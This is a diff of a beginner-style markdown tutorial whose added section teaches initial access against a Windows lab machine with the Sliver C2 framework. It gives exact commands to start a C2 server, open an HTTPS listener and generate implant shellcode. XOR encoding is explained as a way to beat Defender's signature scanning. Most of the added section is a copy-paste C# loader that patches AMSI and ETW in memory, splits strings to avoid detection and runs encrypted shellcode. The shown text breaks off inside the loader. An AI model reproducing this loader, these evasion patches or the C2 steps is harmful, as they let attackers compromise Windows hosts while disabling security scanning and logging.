@@ -32,73 +32,71 @@ So we start from very basics. We go step by step. By the end, you will be able t
 
 # TABLE OF CONTENTS
 
-## PART 1: HOW COMPUTERS STORE INFORMATION
-- Chapter 1: What is Binary
-- Chapter 2: What is a Byte
-- Chapter 3: What is Hexadecimal
-- Chapter 4: How Numbers are Stored
-- Chapter 5: How Text is Stored
-- Chapter 6: What is the Difference Between Data and Code
+## [PART 1: HOW COMPUTERS STORE INFORMATION](#part-1-how-computers-store-information)
+- [Chapter 1: What is Binary](#chapter-1-what-is-binary)
+- [Chapter 2: What is a Byte](#chapter-2-what-is-a-byte)
+- [Chapter 3: What is Hexadecimal](#chapter-3-what-is-hexadecimal)
+- [Chapter 4: How Numbers are Stored](#chapter-4-how-numbers-are-stored-in-memory)
+- [Chapter 5: How Text is Stored](#chapter-5-how-text-is-stored-in-memory)
+- [Chapter 6: What is the Difference Between Data and Code](#chapter-6-the-difference-between-data-and-code)
 
-## PART 2: HOW PROGRAMS RUN
-- Chapter 7: What Does the CPU Do
-- Chapter 8: What is Memory
-- Chapter 9: What is the Stack
-- Chapter 10: User Mode and Kernel Mode
+## [PART 2: HOW PROGRAMS RUN](#part-2-how-programs-run)
+- [Chapter 7: What Does the CPU Do](#chapter-7-what-does-the-cpu-do)
+- [Chapter 8: What is Memory](#chapter-8-what-is-memory)
+- [Chapter 9: What is the Stack](#chapter-9-what-is-the-stack)
+- [Chapter 10: User Mode and Kernel Mode](#chapter-10-user-mode-and-kernel-mode)
 
-## PART 3: LEARNING C PROGRAMMING
-- Chapter 11: Setting Up C on Windows
-- Chapter 12: What is a Variable
-- Chapter 13: What is a Pointer
-- Chapter 14: What is a Function
-- Chapter 15: Arrays and Strings
-- Chapter 16: What is Buffer Overflow
+## [PART 3: LEARNING C PROGRAMMING](#part-3-learning-c-programming)
+- [Chapter 11: Setting Up C on Windows](#chapter-11-setting-up-c-on-windows)
+- [Chapter 12: What is a Variable](#chapter-12-what-is-a-variable)
+- [Chapter 13: What is a Pointer](#chapter-13-what-is-a-pointer)
+- [Chapter 14: What is a Function](#chapter-14-what-is-a-function)
+- [Chapter 15: Arrays and Strings](#chapter-15-arrays-and-strings)
+- [Chapter 16: What is Buffer Overflow](#chapter-16-what-is-buffer-overflow)
 
-## PART 4: HOW SOURCE CODE BECOMES A PROGRAM
-- Chapter 17: What is Compilation
-- Chapter 18: What is Assembly Language
-- Chapter 19: What is PE File Format
-- Chapter 20: How Windows Loads a Program
+## [PART 4: HOW SOURCE CODE BECOMES A PROGRAM](#part-4-how-source-code-becomes-a-program)
+- [Chapter 17: What is Compilation](#chapter-17-what-is-compilation)
+- [Chapter 18: What is Assembly Language](#chapter-18-what-is-assembly-language)
+- [Chapter 19: What is PE File Format](#chapter-19-what-is-pe-file-format)
+- [Chapter 20: How Windows Loads a Program](#chapter-20-how-windows-loads-a-program)
 
-## PART 5: WINDOWS INTERNALS
-- Chapter 21: What is a Process
-- Chapter 22: What is a Thread
-- Chapter 23: What is Virtual Memory
-- Chapter 24: What is Windows API
-- Chapter 25: What is a DLL
+## [PART 5: WINDOWS INTERNALS](#part-5-windows-internals)
+- [Chapter 21: What is a Process](#chapter-21-what-is-a-process)
+- [Chapter 22: What is a Thread](#chapter-22-what-is-a-thread)
+- [Chapter 23: What is Virtual Memory](#chapter-23-what-is-virtual-memory)
+- [Chapter 24: What is Windows API](#chapter-24-what-is-windows-api)
+- [Chapter 25: What is a DLL](#chapter-25-what-is-a-dll)
 
-## PART 6: SHELLCODE
-- Chapter 26: What is Shellcode
-- Chapter 27: How to Write Shellcode
-- Chapter 28: What is a Shellcode Loader
-- Chapter 29: What is Process Injection
+## [PART 6: SHELLCODE BASICS](#part-6-shellcode-basics)
+- [Chapter 26: What is Shellcode](#chapter-26-what-is-shellcode)
+- [Chapter 27: How Shellcode is Written](#chapter-27-how-shellcode-is-written)
+- [Chapter 28: What is a Shellcode Loader](#chapter-28-what-is-a-shellcode-loader)
+- [Chapter 29: What is Process Injection](#chapter-29-what-is-process-injection)
 
-## PART 7: COMMAND AND CONTROL
-- Chapter 30: What is C2
-- Chapter 31: How Sliver Works
-- Chapter 32: Setting Up Sliver
-- Chapter 33: Creating Your Payload
+## [PART 7: INITIAL ACCESS - BYPASSING DEFENDER WITH SLIVER](#part-7-initial-access---bypassing-defender-with-sliver)
+> This is the main attack section. We will:
+> 1. Understand how Defender detects malware
+> 2. Generate Sliver shellcode
+> 3. Encrypt it to avoid signatures
+> 4. Create a C# loader with AMSI/ETW bypass
+> 5. Transfer to WS01 and get shell - WITHOUT disabling Defender!
 
-## PART 8: HOW DETECTION WORKS
-- Chapter 34: How Defender Catches Malware
-- Chapter 35: What is AMSI
-- Chapter 36: What is ETW
+- [Part 7.0: Cryptography Crash Course](#-part-70-cryptography-crash-course-the-fun-version)
+- [Part 7.1: Setting Up Your Attacker Machine (Kali)](#-part-71-setting-up-your-attacker-machine-kali)
+- [Part 7.2: Creating the Listener (HTTPS on port 443)](#-part-72-creating-the-listener)
+- [Part 7.3: Generating Raw Shellcode](#-part-73-generating-raw-shellcode)
+- [Part 7.4: Building the Custom Loader (AMSI/ETW Bypass)](#-part-74-building-the-custom-loader-the-magic-part)
+- [Part 7.5: Encrypting Your Shellcode (XOR with Python)](#-part-75-encrypting-your-shellcode)
+- [Part 7.6: Compiling the Loader (Mono C# Compiler)](#-part-76-compiling-the-loader)
+- [Part 7.7: Hosting the Payload (Sliver Websites)](#-part-77-hosting-the-payload)
+- [Part 7.8: Delivering to the Target](#-part-78-delivering-to-the-target)
+- [Part 7.9: Receiving Your Shell](#-part-79-receiving-your-shell)
+- [Part 7.10: Troubleshooting](#-part-710-troubleshooting)
 
-## PART 9: BYPASSING DETECTION
-- Chapter 37: How to Bypass AMSI
-- Chapter 38: How to Use Direct Syscalls
-- Chapter 39: How to Encrypt Your Payload
-- Chapter 40: Other Evasion Methods
-
-## PART 10: RUNNING THE ATTACK
-- Chapter 41: Building Final Payload
-- Chapter 42: Running on Target
-- Chapter 43: Fixing Problems
-
-## PART 11: EXTRA MATERIAL
-- Chapter 44: Interview Questions
-- Chapter 45: Important Commands
-- Chapter 46: Common Errors and Solutions
+## [PART 8: REFERENCE MATERIAL](#part-8-reference-material)
+- [Chapter 36: Interview Questions](#chapter-36-interview-questions)
+- [Chapter 37: Important Commands Cheatsheet](#chapter-37-important-commands-cheatsheet)
+- [Chapter 38: Common Errors and Solutions](#chapter-38-common-errors-and-solutions)
 
 ---
 
@@ -3669,3 +3667,1897 @@ We cover evasion in the next chapters.
 *Next portion: Command and Control with Sliver*
 
 ---
+
+# PART 7: INITIAL ACCESS - BYPASSING DEFENDER WITH SLIVER
+
+> **IMPORTANT**: We are NOT disabling Defender! We are BYPASSING it with AMSI patches, ETW patches, and encrypted shellcode!
+
+---
+
+# 📖 PART 7.0: Cryptography Crash Course (The Fun Version!)
+
+Before we encrypt our shellcode, let's understand encryption. No code here - just fun examples!
+
+## What is Encryption?
+
+**Encryption** = Scrambling a message so only the right person can read it.
+
+Think of it like a secret language between you and your friend:
+
+```
+ORIGINAL MESSAGE:     "MEET ME AT THE PARK"
+ENCRYPTED MESSAGE:    "PHHW PH DW WKH SDUN"
+```
+
+Anyone who intercepts the message sees gibberish. But your friend, who knows the SECRET KEY, can unscramble it back!
+
+---
+
+## 🔄 Cipher #1: Caesar Cipher (The OG Encryption)
+
+Julius Caesar used this 2000+ years ago to send secret military orders!
+
+### How It Works
+
+**Shift every letter by a fixed number.**
+
+Let's use a shift of 3:
+```
+A → D
+B → E
+C → F
+...
+X → A
+Y → B
+Z → C
+```
+
+### Example
+
+**Message:** ATTACK AT DAWN
+**Shift:** 3
+
+```
+A → D
+T → W
+T → W
+A → D
+C → F
+K → N
+
+Result: DWWDFN DW GDZQ
+```
+
+### Try It Yourself!
+
+Decrypt this (shift of 3):
+```
+KHOOR ZRUOG
+```
+
+<details>
+<summary>Click to see answer</summary>
+
+**HELLO WORLD**
+
+H←K, E←H, L←O, L←O, O←R, etc.
+</details>
+
+### Why It's BAD for Security
+
+Only 25 possible shifts! A computer can try all of them in microseconds.
+
+---
+
+## 🔁 Cipher #2: ROT13 (The Internet's Favorite Toy)
+
+**ROT13** = "Rotate by 13"
+
+It's a Caesar cipher with shift = 13. Special property: **Apply it twice and you get back the original!**
+
+### Why 13?
+
+The alphabet has 26 letters. 13 is exactly half.
+```
+A ↔ N
+B ↔ O
+C ↔ P
+...
+M ↔ Z
+```
+
+### The Magic
+
+```
+Original:    HELLO
+ROT13:       URYYB
+ROT13 again: HELLO  ← Back to original!
+```
+
+### Fun Fact
+
+ROT13 is used on the internet to hide spoilers and punchlines!
+
+```
+Why did the chicken cross the road?
+Answer: Gb trg gb gur bgure fvqr!
+```
+
+Decrypt it: **To get to the other side!**
+
+### Try It!
+
+What does this say?
+```
+FRPERG ZRFFNTR
+```
+
+<details>
+<summary>Click for answer</summary>
+
+**SECRET MESSAGE**
+</details>
+
+---
+
+## ⊕ Cipher #3: XOR (The Hacker's Best Friend)
+
+This is what we'll use to encrypt our shellcode!
+
+### What is XOR?
+
+**XOR** = "Exclusive OR"
+
+It's a simple rule:
+```
+Same = 0
+Different = 1
+```
+
+### The Truth Table
+
+```
+0 XOR 0 = 0   (same = 0)
+0 XOR 1 = 1   (different = 1)
+1 XOR 0 = 1   (different = 1)
+1 XOR 1 = 0   (same = 0)
+```
+
+### The Magic Property
+
+**XOR something twice with the same key = Original!**
+
+```
+Message:     1010
+Key:         1100
+─────────────────
+XOR result:  0110  (encrypted)
+
+Now XOR with key again:
+Encrypted:   0110
+Key:         1100
+─────────────────
+XOR result:  1010  ← ORIGINAL!
+```
+
+### Real Example with Letters
+
+Let's encrypt "A" with key "K":
+
+**Step 1:** Convert to binary
+```
+A = 01000001 (65 in decimal)
+K = 01001011 (75 in decimal)
+```
+
+**Step 2:** XOR each bit
+```
+01000001  (A)
+01001011  (K)
+────────
+00001010  (result = 10 in decimal = newline character)
+```
+
+**Step 3:** To decrypt, XOR with K again!
+```
+00001010  (encrypted)
+01001011  (K)
+────────
+01000001  = A (back to original!)
+```
+
+### Why Hackers Love XOR
+
+1. **Super fast** - Computers do XOR in nanoseconds
+2. **Reversible** - Same operation encrypts and decrypts
+3. **Breaks signatures** - Defender can't recognize the pattern
+
+```
+SLIVER SHELLCODE:  4D 5A 90 00 03 00 00 00...
+XOR with key 0x35: 78 6F A5 35 36 35 35 35...
+                   ↑ Defender: "I don't recognize this!"
+```
+
+### Try It!
+
+```
+What is 1011 XOR 0110?
+```
+
+<details>
+<summary>Click for answer</summary>
+
+```
+1011
+0110
+────
+1101
+```
+Different, different, same, different = 1101
+</details>
+
+---
+
+## 🔐 Cipher #4: AES (The Real Deal)
+
+**AES** = Advanced Encryption Standard
+
+This is what banks, governments, and the military use. It's MUCH stronger than XOR.
+
+### How Strong?
+
+AES-256 has 2^256 possible keys. That's:
+```
+115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936
+```
+
+If you tried 1 billion keys per second, it would take longer than the age of the universe to try them all!
+
+### How AES Works (Simplified)
+
+1. **Split** message into 16-byte blocks
+2. **Substitute** each byte using a secret table
+3. **Shift** rows around
+4. **Mix** columns mathematically
+5. **Repeat** steps 2-4 multiple times (10-14 rounds)
+
+Each round makes it exponentially harder to crack!
+
+### AES vs XOR
+
+| Feature | XOR | AES |
+|---------|-----|-----|
+| Speed | Super fast | Fast |
+| Security | Weak (if key is short) | Extremely strong |
+| Use case | Obfuscation, quick hiding | Real encryption |
+| Key size | Any | 128, 192, or 256 bits |
+
+### Why We Use XOR Instead of AES for Shellcode
+
+For our purpose, we just need to **fool Defender's signature scanner**. 
+
+- AES is overkill
+- XOR is simpler to implement
+- Both hide the pattern equally well for our use case
+
+---
+
+## 🎯 The Big Picture
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                    ENCRYPTION SUMMARY                           │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│  CAESAR/ROT13:                                                  │
+│  - Shift letters by N positions                                 │
+│  - Easy to crack (only 25 possibilities)                        │
+│  - Good for hiding spoilers, bad for secrets                    │
+│                                                                 │
+│  XOR:                                                           │
+│  - Flip bits based on key                                       │
+│  - Same operation encrypts AND decrypts                         │
+│  - Perfect for breaking malware signatures                      │
+│  - We'll use this for our shellcode!                            │
+│                                                                 │
+│  AES:                                                           │
+│  - Complex mathematical transformations                         │
+│  - Virtually uncrackable with proper key                        │
+│  - Used by banks, military, governments                         │
+│  - Overkill for our use case                                    │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Quick Quiz!
+
+**Q1:** If I XOR 0101 with 1010, what do I get?
+<details>
+<summary>Answer</summary>
+1111 (all bits are different)
+</details>
+
+**Q2:** What's special about ROT13?
+<details>
+<summary>Answer</summary>
+Apply it twice and you get the original back! (Because 13 + 13 = 26 = full alphabet)
+</details>
+
+**Q3:** Why don't we just use AES to encrypt our shellcode?
+<details>
+<summary>Answer</summary>
+XOR is simpler and fast. For breaking Defender's signature detection, XOR is sufficient. AES is overkill.
+</details>
+
+**Q4:** Decrypt this ROT13: "UNPXRE"
+<details>
+<summary>Answer</summary>
+HACKER
+</details>
+
+---
+
+*Now you understand encryption! Let's use XOR to hide our shellcode from Defender...*
+
+---
+
+# 📖 PART 7.1: Setting Up Your Attacker Machine (Kali)
+
+Now we start the actual work. Follow EXACTLY.
+
+## 7.1.1: What is Kali Linux?
+
+**Kali Linux** = A Linux operating system made for hackers.
+
+It comes preinstalled with hundreds of hacking tools. It's what you'll use for:
+- Attacking systems
+- Running C2 servers
+- Cracking passwords
+- Network scanning
+
+**In our lab, Kali is at IP address `192.168.100.100`.**
+
+## 7.1.2: Installing Sliver C2 (Step by Step)
+
+### Step 7.1.2.1: Open Terminal on Kali
+
+1. Log into your Kali machine
+2. Click the terminal icon in the taskbar (black rectangle icon)
+3. Or press `Ctrl + Alt + T`
+
+You should see:
+```
+┌──(kali㉿kali)-[~]
+└─$ _
+```
+
+### Step 7.1.2.2: Check if Sliver is Already Installed
+
+Type this command and press Enter:
+```bash
+which sliver-server
+```
+
+If you see:
+```
+/usr/local/bin/sliver-server
+```
+**Sliver is installed! Skip to Step 7.1.2.5.**
+
+If you see nothing (blank output): **Sliver is not installed. Continue to next step.**
+
+### Step 7.1.2.3: Install Sliver
+
+Type this command and press Enter:
+```bash
+curl https://sliver.sh/install | sudo bash
+```
+
+**What this command does:**
+- `curl https://sliver.sh/install` = Downloads the install script from sliver.sh website
+- `|` = Pipe (send output to next command)
+- `sudo bash` = Run the script as administrator
+
+You'll be asked for password:
+```
+[sudo] password for kali:
+```
+
+Type your Kali password (default is `kali`) and press Enter. 
+**Note: Password won't show as you type. That's normal.**
+
+Wait for installation (2-5 minutes):
+```
+[*] Downloading Sliver...
+[*] Installing Sliver...
+[*] Installation complete!
+```
+
+### Step 7.1.2.4: Verify Installation
+
+Type this command:
+```bash
+sliver-server version
+```
+
+You should see something like:
+```
+sliver-server v1.5.42
+Git commit: abc123
+Compiled: Mon Dec 25 2024
+```
+
+### Step 7.1.2.5: Start Sliver Server
+
+Type this command:
+```bash
+sudo sliver-server
+```
+
+**What happens:**
+- Sliver starts up
+- You'll see a cool ASCII banner
+- You get a new prompt: `[server] sliver >`
+
+**What you should see:**
+```
+    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
+    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
+    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
+    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
+    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
+    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+
+All hackers gain introspection
+
+[server] sliver > _
+```
+
+⚠️ **Keep this terminal window open! This is your C2 server.**
+
+## 7.1.3: Understanding Sliver's Interface
+
+You're now in the Sliver console. Let's understand it.
+
+### The Prompt
+```
+[server] sliver >
+```
+- `[server]` = You're connected to the Sliver server
+- `sliver >` = Waiting for your command
+
+### Getting Help
+Type:
+```
+help
+```
+You'll see all available commands. There are many. Don't worry, we'll only use a few.
+
+### Important Commands We'll Use
+
+| Command | What It Does |
+|---------|--------------|
+| `https` | Create a listener for HTTPS connections |
+| `generate` | Create a new payload/implant |
+| `websites` | Host files on Sliver's web server |
+| `sessions` | List connected implants |
+| `use` | Interact with a session |
+| `jobs` | List running listeners |
+
+---
+
+**END OF PART 7.1**
+
+---
+
+# 📖 PART 7.2: Creating the Listener
+
+## 7.2.1: What is a Listener?
+
+### The Simple Explanation
+
+A listener is like a phone waiting for calls.
+
+When your payload runs on the victim's computer, it needs to "call home" to your Kali machine. The listener is what picks up that call.
+
+```
+VICTIM (WS01)                         ATTACKER (KALI)
+┌─────────────────┐                   ┌─────────────────┐
+│ Payload runs    │                   │                 │
+│ "Calling home   │ ────HTTPS────────►│ LISTENER        │
+│  to 192.168.100 │                   │ "Incoming call  │
+│  .100:443..."   │                   │  from WS01!"    │
+└─────────────────┘                   └─────────────────┘
+```
+
+### Why HTTPS on Port 443?
+
+- **HTTPS** = Encrypted (can't see what's inside)
+- **Port 443** = Normal web browsing port (not suspicious)
+
+If you used a weird port like 4444, firewalls might block it. Port 443 is almost always allowed.
+
+## 7.2.2: Creating an HTTPS Listener (Exact Commands)
+
+### Step 7.2.2.1: Create the Listener
+
+In your Sliver console, type this command EXACTLY:
+```
+https --lhost 192.168.100.100 --lport 443
+```
+Press Enter.
+
+**What each part means:**
+- `https` = Create an HTTPS listener
+- `--lhost 192.168.100.100` = Listen on this IP (your Kali's IP)
+- `--lport 443` = Listen on port 443
+
+### Step 7.2.2.2: Verify It's Running
+
+You should see:
+```
+[*] Starting HTTPS listener ...
+[*] Successfully started job #1 (https://192.168.100.100:443)
+```
+
+**If you see an error like "port already in use":**
+```bash
+# In a NEW terminal (not Sliver), run:
+sudo lsof -i :443
+# This shows what's using port 443
+
+# Kill it:
+sudo kill -9 <PID>
+
+# Then try the https command again in Sliver
+```
+
+### Step 7.2.2.3: Double-Check with `jobs`
+
+Type:
+```
+jobs
+```
+
+You should see:
+```
+ ID   Name   Protocol   Port
+════════════════════════════
+ 1    https  https      443
+```
+
+This confirms your listener is running.
+
+**Your Kali is now WAITING for connections on port 443!**
+
+---
+
+**END OF PART 7.2**
+
+---
+
+# 📖 PART 7.3: Generating Raw Shellcode
+
+Now we create the actual malicious code that will run on the victim.
+
+## 7.3.1: Why Shellcode Instead of EXE?
+
+Sliver can generate a complete EXE, so why do we want raw shellcode?
+
+**If Sliver generates the EXE:**
+- Sliver controls how it runs
+- Limited evasion options
+- Defender knows what Sliver EXEs look like = **DETECTED**
+
+**If WE generate shellcode and wrap it ourselves:**
+- WE control how it runs
+- WE add our own evasion (AMSI bypass, etc.)
+- Defender doesn't recognize our custom loader = **EVASION**
+
+## 7.3.2: Generating Shellcode (Exact Command)
+
+### Step 7.3.2.1: Run the Generate Command
+
+In Sliver console, type this command EXACTLY (it's one long command):
+```
+generate --http 192.168.100.100:443 --os windows --arch amd64 --format shellcode --skip-symbols --save /tmp/
+```
+Press Enter.
+
+### Step 7.3.2.2: Understand What You Typed
+
+| Part | Meaning |
+|------|---------|
+| `generate` | Create a new implant |
+| `--http 192.168.100.100:443` | Implant will connect to this address (your listener) |
+| `--os windows` | Target Windows OS |
+| `--arch amd64` | 64-bit architecture (modern computers) |
+| `--format shellcode` | Output as raw bytes (not EXE!) |
+| `--skip-symbols` | Don't include debug info (smaller, harder to analyze) |
+| `--save /tmp/` | Save to /tmp/ folder |
+
+### Step 7.3.2.3: What You Should See
+
+```
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 23s
+[*] Implant saved to /tmp/RANDOM_NAME.bin
+```
+
+The file name will be random like `DELICIOUS_GRAPE.bin` or similar. **Note down the name!**
+
+### Step 7.3.2.4: Rename the File (Easier to Work With)
+
+Open a **NEW terminal window** (not Sliver), and run:
+```bash
+# First, see what file was created
+ls -la /tmp/*.bin
+
+# Rename to simpler name
+mv /tmp/RANDOM_NAME.bin /tmp/implant.bin
+```
+Replace `RANDOM_NAME` with the actual name from Step 7.3.2.3.
+
+### Step 7.3.2.5: Check the File
+
+```bash
+# See file size
+ls -la /tmp/implant.bin
+
+# Should show something like:
+# -rw-r--r-- 1 root root 8234567 Dec 27 12:00 /tmp/implant.bin
+```
+
+The file size will be **8-15 MB** typically.
+
+### Step 7.3.2.6: Peek at the Shellcode (Optional, For Learning)
+
+```bash
+# See first 50 bytes as hex
+xxd /tmp/implant.bin | head -5
+```
+
+Output looks like:
+```
+00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
+00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
+```
+
+These are the raw bytes that will execute on the victim. **Right now, it's not encrypted.**
+
+---
+
+**END OF PART 7.3**
+
+---
+
+# 📖 PART 7.4: Building the Custom Loader (The Magic Part)
+
+**This is the MOST IMPORTANT PART.** We're building the code that:
+1. **Bypasses AMSI** (so our code isn't scanned)
+2. **Bypasses ETW** (so our activity isn't logged)
+3. **Decrypts shellcode** (so Defender can't see it)
+4. **Executes shellcode** (runs the Sliver implant)
+
+## 7.4.1: What is a Loader?
+
+A loader is a program that loads and runs OTHER code.
+
+```
+WindowsUpdate.exe (Loader)
+├── Startup
+│   └── Patch AMSI    ← First, disable security
+│   └── Patch ETW     ← Then, disable logging
+├── Load
+│   └── Decrypt shellcode from inside itself
+├── Execute
+│   └── Run the shellcode
+│   └── Shellcode connects to C2
+│   └── You get a session
+```
+
+**Think of it like a Trojan Horse:**
+- The wooden horse = Our loader (looks innocent)
+- Greek soldiers inside = Our encrypted shellcode (hidden payload)
+- At night, soldiers come out = Shellcode decrypts and runs
+
+## 7.4.2: The Complete C# Loader (Line-by-Line Explanation)
+
+I'll show you the **COMPLETE code**, then explain **EVERY line**.
+
+### Step 7.4.2.1: Create the File
+
+In your terminal (not Sliver), create the loader file:
+```bash
+nano /tmp/Loader.cs
+```
+This opens the nano text editor. You'll type/paste code here.
+
+### Step 7.4.2.2: The Complete Loader Code
+
+**Copy and paste this ENTIRE code into nano:**
+
+```csharp
+// ============================================================
+// LINE 1-8: COMMENTS (Explanation, ignored by computer)
+// ============================================================
+// ORSUBANK LAB - CUSTOM SHELLCODE LOADER
+// This loader does:
+// 1. Bypasses AMSI (so our code isn't scanned)
+// 2. Bypasses ETW (so our activity isn't logged)
+// 3. Decrypts shellcode that's hidden inside it
+// 4. Runs the shellcode in memory
+// ============================================================
+
+// ============================================================
+// LINE 9-11: USING STATEMENTS
+// These are like "imports" - telling C# what libraries we need
+// ============================================================
+using System;                        // Basic C# stuff
+using System.Runtime.InteropServices; // Lets us call Windows API
+
+// ============================================================
+// LINE 12-15: NAMESPACE AND CLASS
+// Just organizational structure, required by C#
+// ============================================================
+namespace Loader                      // Our project name
+{
+    class Program                     // Our main class
+    {
+        // ============================================================
+        // LINE 16-52: WINDOWS API DECLARATIONS
+        // These tell C# about Windows functions we want to use
+        // DllImport = "Load this from a Windows DLL file"
+        // ============================================================
+
+        // GetProcAddress: Find a function's address in a DLL
+        // We use this to find AmsiScanBuffer so we can patch it
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        // LoadLibrary: Load a DLL into memory
+        // We use this to load amsi.dll and ntdll.dll
+        [DllImport("kernel32.dll")]
+        static extern IntPtr LoadLibrary(string name);
+
+        // VirtualProtect: Change memory permissions
+        // Memory is normally "read-only", we make it writable to patch
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
+            uint flNewProtect, out uint lpflOldProtect);
+
+        // VirtualAlloc: Allocate new memory
+        // We allocate memory for our shellcode
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
+            uint flAllocationType, uint flProtect);
+
+        // CreateThread: Create a new thread to run code
+        // We create a thread that runs our shellcode
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        // WaitForSingleObject: Wait for thread to finish
+        // We wait forever (0xFFFFFFFF) so the program doesn't exit
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        // ============================================================
+        // LINE 53-57: CONSTANTS
+        // Magic numbers Windows uses for memory operations
+        // ============================================================
+        const uint PAGE_EXECUTE_READWRITE = 0x40;  // Memory can be read, written, AND executed
+        const uint MEM_COMMIT = 0x1000;            // Actually allocate the memory
+        const uint MEM_RESERVE = 0x2000;           // Reserve address space
+
+        // ============================================================
+        // LINE 58-95: AMSI BYPASS FUNCTION
+        // This patches AmsiScanBuffer to always return "invalid"
+        // ============================================================
+        static void BypassAMSI()
+        {
+            // Try-catch: If anything fails, just continue (don't crash)
+            try
+            {
+                // STEP 1: Load amsi.dll
+                // String concatenation (a + m + s + i) avoids detection
+                // If we wrote "amsi.dll" directly, Defender might flag it
+                IntPtr lib = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
+
+                // STEP 2: Find AmsiScanBuffer function address
+                // Again, we split the string to avoid detection
+                IntPtr addr = GetProcAddress(lib, 
+                    "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
+
+                // STEP 3: The patch bytes
+                // These assembly instructions make the function return immediately
+                // 
+                // What these bytes mean:
+                // 0x31, 0xC0 = XOR EAX, EAX    (Set return value to 0)
+                // 0xB8, 0x57, 0x00, 0x07, 0x80 = MOV EAX, 0x80070057 (Set to E_INVALIDARG)
+                // 0xC3 = RET                   (Return from function)
+                //
+                // So the function now does: "Return E_INVALIDARG immediately"
+                // AMSI thinks the scan failed, so it lets everything through
+                byte[] patch = { 0x31, 0xC0, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+                // STEP 4: Make the memory writable
+                // The code section is normally read-only (protection against malware)
+                // We need to make it writable so we can patch it
+                uint oldProtect;
+                VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+
+                // STEP 5: Write our patch bytes
+                // Marshal.Copy copies bytes from our array into the function's memory
+                Marshal.Copy(patch, 0, addr, patch.Length);
+
+                // STEP 6: Restore original protection
+                // Not strictly necessary, but good practice
+                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+
+                // AMSI is now bypassed!
+            }
+            catch 
+            { 
+                // If anything fails, silently continue
+                // (Don't crash, don't show error)
+            }
+        }
+
+        // ============================================================
+        // LINE 96-130: ETW BYPASS FUNCTION
+        // This patches EtwEventWrite to do nothing
+        // ============================================================
+        static void BypassETW()
+        {
+            try
+            {
+                // STEP 1: Load ntdll.dll (where EtwEventWrite lives)
+                IntPtr lib = LoadLibrary("n" + "t" + "d" + "l" + "l" + ".dll");
+
+                // STEP 2: Find EtwEventWrite function address
+                IntPtr addr = GetProcAddress(lib, 
+                    "E" + "t" + "w" + "E" + "v" + "e" + "n" + "t" + "W" + "r" + "i" + "t" + "e");
+
+                // STEP 3: Patch bytes
+                // 0x33, 0xC0 = XOR EAX, EAX (return 0 = success)
+                // 0xC3 = RET (return immediately)
+                byte[] patch = { 0x33, 0xC0, 0xC3 };
+
+                // STEP 4-6: Same as AMSI bypass
+                uint oldProtect;
+                VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+                Marshal.Copy(patch, 0, addr, patch.Length);
+                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+
+                // ETW is now bypassed!
+            }
+            catch { }
+        }
+
+        // ============================================================
+        // LINE 131-145: XOR DECRYPTION FUNCTION
+        // Decrypts our shellcode using XOR
+        // ============================================================
+        static byte[] XorDecrypt(byte[] data, byte key)
+        {
+            // Create array to hold decrypted data
+            byte[] result = new byte[data.Length];
+
+            // For each byte:
+            for (int i = 0; i < data.Length; i++)
+            {
+                // XOR with key to decrypt
+                // If original was encrypted with: encrypted = original XOR key
+                // Then: original = encrypted XOR key (XOR reverses itself)
+                result[i] = (byte)(data[i] ^ key);
+            }
+
+            return result;
+        }
+
+        // ============================================================
+        // LINE 146-200: MAIN FUNCTION (Entry Point)
+        // This is what runs when you double-click the EXE
+        // ============================================================
+        static void Main(string[] args)
+        {
+            // ========================================
+            // STAGE 1: BYPASS SECURITY
+            // ========================================
+            // Do this FIRST, before ANYTHING else!
+            // If we decrypt shellcode before bypassing AMSI,
+            // Defender might scan it and block us!
+
+            BypassAMSI();  // Patch AMSI so our code won't be scanned
+            BypassETW();   // Patch ETW so our activity won't be logged
+
+            // ========================================
+            // STAGE 2: ENCRYPTED SHELLCODE
+            // ========================================
+            // THIS IS WHERE YOUR ENCRYPTED SHELLCODE GOES!
+            // Replace the placeholder with your actual bytes
+            // (We'll generate these in the next section)
+
+            byte[] encryptedShellcode = new byte[] {
+                // ╔════════════════════════════════════════════════════════════╗
+                // ║  PLACEHOLDER - REPLACE WITH YOUR ENCRYPTED SHELLCODE!     ║
+                // ║  Use the Python script to generate these bytes            ║
+                // ╚════════════════════════════════════════════════════════════╝
+                0x00, 0x00, 0x00, 0x00  // DELETE THIS LINE when adding real shellcode
+            };
+
+            // The XOR key we used for encryption
+            // MUST match the key you used when encrypting!
+            byte xorKey = 0x35;
+
+            // ========================================
+            // STAGE 3: DECRYPT SHELLCODE
+            // ========================================
